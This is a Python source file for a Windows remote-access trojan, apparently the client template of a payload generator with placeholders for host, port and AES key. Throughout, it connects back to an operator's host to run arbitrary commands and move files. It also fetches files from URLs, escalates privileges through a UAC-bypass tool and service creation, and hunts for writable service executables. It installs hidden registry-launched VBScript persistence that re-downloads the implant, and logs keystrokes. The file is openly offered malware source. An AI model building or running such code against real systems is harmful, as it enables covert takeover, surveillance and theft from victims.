#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess, socket, base64, time, os, sys, urllib2, pythoncom, pyHook, logging
BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
secret = '"""+secret+"""'
HOST = '"""+host+"""'
PORT = """+port+"""
active = False
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
	sock.sendall(EncodeAES(cipher, cmd + end))
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
	data = ""
	l = sock.recv(1024)
	while(l):
		decrypted = DecodeAES(cipher, l)
		data = data + decrypted
		if data.endswith(end) == True:
			break
		else:
			l = sock.recv(1024)
	return data[:-len(end)]
def Prompt(sock, promptmsg):
	Send(sock, promptmsg)
	answer = Receive(sock)
	return answer
def Upload(sock, filename):
	bgtr = True
	try:
		f = open(filename, 'rb')
		while 1:
			fileData = f.read()
			if fileData == '': break
			Send(sock, fileData, "")
		f.close()
	except:
		time.sleep(0.1)
	time.sleep(0.8)
	Send(sock, "")
	time.sleep(0.8)
	return "Finished download."
def Download(sock, filename):
	g = open(filename, 'wb')
	fileData = Receive(sock)
	time.sleep(0.8)
	g.write(fileData)
	g.close()
	return "Finished upload."
def Downhttp(sock, url):
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	g = open(filename, 'wb')
	u = urllib2.urlopen(url)
	g.write(u.read())
	g.close()
	return "Finished download."
def Privs(sock):
	if os.name == 'nt':
		privinfo = '\\nUsername:		   ' + Exec('echo %USERNAME%')
		privinfo += Exec('systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"')
		winversion = Exec('systeminfo')
		windowsnew = -1
		windowsold = -1
		windowsnew += winversion.find('Windows 7')
		windowsnew += winversion.find('Windows 8')
		windowsnew += winversion.find('Windows Vista')
		windowsnew += winversion.find('Windows VistaT')
		windowsnew += winversion.find('Windows Server 2008')
		windowsold += winversion.find('Windows XP')
		windowsold += winversion.find('Server 2003')
		if windowsnew > 0:
			privinfo += Exec('whoami /priv') + '\\n'
		admincheck = Exec('net localgroup administrators | find "%USERNAME%"')
		if admincheck != '':
			privinfo += 'Administrator privilege detected.\\n\\n'
			if windowsnew > 0:
				bypassuac = Prompt(sock, privinfo+'Enter location/url for BypassUAC: ')
				if bypassuac.startswith("http") == True:
					try:
						c = Downhttp(sock, bypassuac)
						d = os.getcwd() + '\\\\' + bypassuac.split('/')[-1]
					except:
						return "Download failed: invalid url.\\n"
				else:
					try:
						c = open(bypassuac)
						c.close()
						d = bypassuac
					except:
						return "Invalid location for BypassUAC.\\n"
			curdir = os.path.join(sys.path[0], sys.argv[0])
			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc create blah binPath= "cmd.exe /c ' + curdir + '" type= own start= auto')
			if windowsold > 0: elvpri = Exec('sc create blah binPath= "' + curdir + '" type= own start= auto')
			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc start blah')
			if windowsold > 0: elvpri = Exec('sc start blah')
			return "\\nPrivilege escalation complete.\\n"
		if windowsold > 0:
			privinfo += 'Unable to escalate privileges.\\n'
			return privinfo
		privinfo += 'Searching for weak permissions...\\n\\n'
		permatch = []
		permatch.append("BUILTIN\Users:(I)(F)")
		permatch.append("BUILTIN\Users:(F)")
		permbool = False
		xv = Exec('for /f "tokens=2 delims=\\'=\\'" %a in (\\'wmic service list full^|find /i "pathname"^|find /i /v "system32"\\') do @echo %a >> p1.txt')
		xv = Exec('for /f eol^=^"^ delims^=^" %a in (p1.txt) do cmd.exe /c icacls "%a" >> p2.txt')
		time.sleep(40)
		ap = 0
		bp = 0
		dp = open('p2.txt')
		lines = dp.readlines()
		for line in lines:
			cp = 0
			while cp < len(permatch):
				j = line.find(permatch[cp])
				if j != -1:
					if permbool == False:
						privinfo += 'The following directories have write access:\\n\\n'
						permbool = True
					bp = ap
					while True:
						if len(lines[bp].split('\\\\')) > 2:
							while bp <= ap:
								privinfo += lines[bp]
								bp += 1
							break
						else:
							bp -= 1
				cp += 1
			ap += 1
		time.sleep(4)
		if permbool == True: privinfo += '\\nReplace executable with Python shell.\\n'
		if permbool == False: privinfo += '\\nNo directories with misconfigured premissions found.\\n'
		dp.close()
		xv = Exec('del p1.txt')
		xv = Exec('del p2.txt')
		return privinfo
def Persist(sock, redown=None, newdir=None):
	if os.name == 'nt':
		privscheck = Exec('reg query "HKU\S-1-5-19" | find "error"')
		if privscheck != '':
			return "You must be authority\system to enable persistence.\\n"
		else:
			exedir = os.path.join(sys.path[0], sys.argv[0])
			exeown = exedir.split('\\\\')[-1]
			vbsdir = os.getcwd() + '\\\\' + 'vbscript.vbs'
			if redown == None: vbscript = 'state = 1\\nhidden = 0\\nwshname = "' + exedir + '"\\nvbsname = "' + vbsdir + '"\\nWhile state = 1\\nexist = ReportFileStatus(wshname)\\nIf exist = True then\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(wshname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(vbsname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nSet WshShell = WScript.CreateObject ("WScript.Shell")\\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\\nFor Each objProcess in colProcessList\\nif objProcess.name = "' + exeown + '" then\\nvFound = True\\nEnd if\\nNext\\nIf vFound = True then\\nwscript.sleep 50000\\nElse\\nWshShell.Run  + exedir + ,hidden\\nwscript.sleep 50000\\nEnd If\\nvFound = False\\nElse\\nwscript.sleep 50000\\nEnd If\\nWend\\nFunction ReportFileStatus(filespec)\\nDim fso, msg\\nSet fso = CreateObject("Scripting.FileSystemObject")\\nIf (fso.FileExists(filespec)) Then\\nmsg = True\\nElse\\nmsg = False\\nEnd If\\nReportFileStatus = msg\\nEnd Function\\n'
			else:
				if newdir == None: 
					newdir = exedir
					newexe = exeown
				else: 
					newexe = newdir.split('\\\\')[-1]
				vbscript = 'state = 1\\nhidden = 0\\nwshname = "' + exedir + '"\\nvbsname = "' + vbsdir + '"\\nurlname = "' + redown + '"\\ndirname = "' + newdir + '"\\nWhile state = 1\\nexist1 = ReportFileStatus(wshname)\\nexist2 = ReportFileStatus(dirname)\\nIf exist1 = False And exist2 = False then\\ndownload urlname, dirname\\nEnd If\\nIf exist1 = True Or exist2 = True then\\nif exist1 = True then\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(wshname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nexist2 = False\\nend if\\nif exist2 = True then\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(dirname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nend if\\nset objFSO = CreateObject("Scripting.FileSystemObject")\\nset objFile = objFSO.GetFile(vbsname)\\nif objFile.Attributes AND 2 then\\nelse\\nobjFile.Attributes = objFile.Attributes + 2\\nend if\\nSet WshShell = WScript.CreateObject ("WScript.Shell")\\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\\nFor Each objProcess in colProcessList\\nif objProcess.name = "' + exeown + '" OR objProcess.name = "' + newexe + '" then\\nvFound = True\\nEnd if\\nNext\\nIf vFound = True then\\nwscript.sleep 50000\\nEnd If\\nIf vFound = False then\\nIf exist1 = True then\\nWshShell.Run  + exedir + ,hidden\\nEnd If\\nIf exist2 = True then\\nWshShell.Run  + dirname + ,hidden\\nEnd If\\nwscript.sleep 50000\\nEnd If\\nvFound = False\\nEnd If\\nWend\\nFunction ReportFileStatus(filespec)\\nDim fso, msg\\nSet fso = CreateObject("Scripting.FileSystemObject")\\nIf (fso.FileExists(filespec)) Then\\nmsg = True\\nElse\\nmsg = False\\nEnd If\\nReportFileStatus = msg\\nEnd Function\\nfunction download(sFileURL, sLocation)\\nSet objXMLHTTP = CreateObject("MSXML2.XMLHTTP")\\nobjXMLHTTP.open "GET", sFileURL, false\\nobjXMLHTTP.send()\\ndo until objXMLHTTP.Status = 200 :  wscript.sleep(1000) :  loop\\nIf objXMLHTTP.Status = 200 Then\\nSet objADOStream = CreateObject("ADODB.Stream")\\nobjADOStream.Open\\nobjADOStream.Type = 1\\nobjADOStream.Write objXMLHTTP.ResponseBody\\nobjADOStream.Position = 0\\nSet objFSO = Createobject("Scripting.FileSystemObject")\\nIf objFSO.Fileexists(sLocation) Then objFSO.DeleteFile sLocation\\nSet objFSO = Nothing\\nobjADOStream.SaveToFile sLocation\\nobjADOStream.Close\\nSet objADOStream = Nothing\\nEnd if\\nSet objXMLHTTP = Nothing\\nEnd function\\n'
			
			vbs = open('vbscript.vbs', 'wb')
			vbs.write(vbscript)
			vbs.close()
			persist = Exec('reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v blah /t REG_SZ /d "' + vbsdir + '"')
			persist += '\\nPersistence complete.\\n'
			return persist
def Exec(cmde):
	if cmde:
		execproc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		cmdoutput = execproc.stdout.read() + execproc.stderr.read()
		return cmdoutput
	else:
		return "Enter a command.\\n"
LOG_STATE = False
LOG_FILENAME = 'keylog.txt'
def OnKeyboardEvent(event):
    logging.basicConfig(filename=LOG_FILENAME,
                        level=logging.DEBUG,
                        format='%(message)s')
    logging.log(10,chr(event.Ascii))
    return True		
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))
		cipher = AES.new(secret)
		data = Receive(s)
		if data == 'Activate':
			active = True
			Send(s, "\\n"+os.getcwd()+">")
		while active:
			data = Receive(s)
			if data == '':
				time.sleep(0.02)
			if data == "quit" or data == "terminate":
				Send(s, "quitted")
				break
			elif data.startswith("cd ") == True:
				try:
					os.chdir(data[3:])
					stdoutput = ""
				except:
					stdoutput = "Error opening directory.\\n"
				
			# check for download
			elif data.startswith("download") == True:
				# Upload the file
				stdoutput = Upload(s, data[9:])
			
			elif data.startswith("downhttp") == True:
				# Download from url
				stdoutput = Downhttp(s, data[9:])

			# check for upload
			elif data.startswith("upload") == True:
				# Download the file
				stdoutput = Download(s, data[7:])
				
			elif data.startswith("privs") == True:
				# Attempt to elevate privs
				stdoutput = Privs(s)
				
			elif data.startswith("persist") == True:
				# Attempt persistence
				if len(data.split(' ')) == 1: stdoutput = Persist(s)
				elif len(data.split(' ')) == 2: stdoutput = Persist(s, data.split(' ')[1])
				elif len(data.split(' ')) == 3: stdoutput = Persist(s, data.split(' ')[1], data.split(' ')[2])
			
			elif data.startswith("keylog") == True:
				# Begin keylogging
				if LOG_STATE == False:
					try:
						# set to True
						LOG_STATE = True
						hm = pyHook.HookManager()
						hm.KeyDown = OnKeyboardEvent
						hm.HookKeyboard()
						pythoncom.PumpMessages()
						stdoutput = "Logging keystrokes to: "+LOG_FILENAME+"...\\n"
					except:
						ctypes.windll.user32.PostQuitMessage(0)
						# set to False
						LOG_STATE = False
						stdoutput = "Keystrokes have been logged to: "+LOG_FILENAME+".\\n"
						
					
			else:
				# execute command.
				stdoutput = Exec(data)
				
			# send data
			stdoutput = stdoutput+"\\n"+os.getcwd()+">"
			Send(s, stdoutput)
			
		# loop ends here
		
		if data == "terminate":
			break
		time.sleep(3)
	except socket.error:
		s.close()
		time.sleep(10)
		continue
